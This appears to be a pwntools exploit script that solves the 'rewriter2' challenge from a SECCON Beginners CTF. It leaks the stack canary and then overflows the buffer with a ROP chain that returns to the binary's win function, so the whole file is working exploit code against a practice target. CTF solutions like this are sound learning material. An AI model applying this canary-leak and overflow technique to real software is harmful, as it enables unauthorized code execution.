#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./rewriter2"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("rewriter2.beginners.seccon.games", 9001)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+78
		b *main+153
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


win = elf.symbols['win']
payload = b"A" * 0x8 * 5
payload += b'B'
p.recvuntil("?")
p.send(payload)

p.recvuntil('B')
canary = u64(b'\0' + p.recv(7))
log.info("canary: " + hex(canary))

rop_ret = 0x00401564
payload = b"A" * 0x8 * 5
payload += p64(canary)
payload += b"B" * 0x8
payload += p64(rop_ret)
payload += p64(win)
p.recvuntil("?")
p.send(payload)

p.interactive()
